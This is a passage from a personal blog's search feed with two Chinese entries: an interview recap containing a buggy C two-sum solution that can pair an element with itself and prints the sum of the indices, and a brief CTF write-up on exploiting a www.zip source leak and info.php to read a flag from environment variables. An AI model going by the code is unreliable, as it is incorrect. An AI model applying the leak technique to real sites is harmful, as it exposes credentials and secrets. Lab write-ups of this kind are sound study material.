class="line">给定一个整数数组和一个目标值，找到数组中和为目标值的两个数，并返回他们的数组下标</span><br></pre></td></tr></table></figure><p>问擅长什么语言，我说c、python、java</p><p>那好用c语言来写</p><p>刚开始不太会，后来在面试官眼皮下面开始调试代码。。。最后也是磨磨唧唧写完了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.<span class="property">h</span>&gt;</span><br><span class="line">int <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    int nums[<span class="number">4</span>] = &#123; <span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span> &#125;;</span><br><span class="line">    int target = <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* code */</span></span><br><span class="line">        int tmp = nums[i];</span><br><span class="line">        <span class="keyword">for</span> (int j = i; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmp + nums[j] == target) &#123;</span><br><span class="line">                <span class="title function_">printf</span>(<span class="string">&quot;%d&quot;</span>, i + j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、结果"><a href="#4、结果" class="headerlink" title="4、结果"></a>4、结果</h2><p>wait等待，如果没有二面总结，估计就凉了。个人感觉Android回答的还行哈哈哈</p><p>算法写的就是一坨，web防护不会估计有降分（检测环境那些）</p>]]></content>
      
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>www.zip文件泄露题目实战</title>
      <link href="/2025/03/12/www-zip%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE%E5%AE%9E%E6%88%98/"/>
      <url>/2025/03/12/www-zip%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p>给了这样的</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113600553.png" alt="image-20250314113600471"></p><p>登录和密码，源码泄露</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113622381.png" alt="image-20250314113622338"></p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113633453.png" alt="image-20250314113633380"></p><p>看到有个info.php，访问他，flag在环境变量里</p><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314113646833.png" alt="image-20250314113646777"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
